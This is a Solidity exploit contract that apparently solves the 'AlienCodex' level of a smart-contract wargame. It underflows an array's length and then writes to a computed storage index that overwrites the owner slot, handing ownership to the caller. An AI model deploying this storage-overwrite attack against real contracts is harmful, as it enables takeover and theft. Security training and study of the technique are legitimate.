// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IAlienCodex {
    function revise(uint i, bytes32 _content) external;
    function make_contact() external;
    function retract() external;
}

contract HackAlienCodex {
    address levelInstance = address(0x35Ee183f26d71167042955d183E80e38bF5AB660);
    
    constructor() {
        claim();
    }
    
    function claim() public {
        unchecked{
            uint index = uint256(2)**uint256(256) - uint256(keccak256(abi.encodePacked(uint256(1))));

            IAlienCodex(levelInstance).make_contact();
            IAlienCodex(levelInstance).retract();
            IAlienCodex(levelInstance).revise(index, bytes32(uint256(uint160(msg.sender))));
        }
    }
}
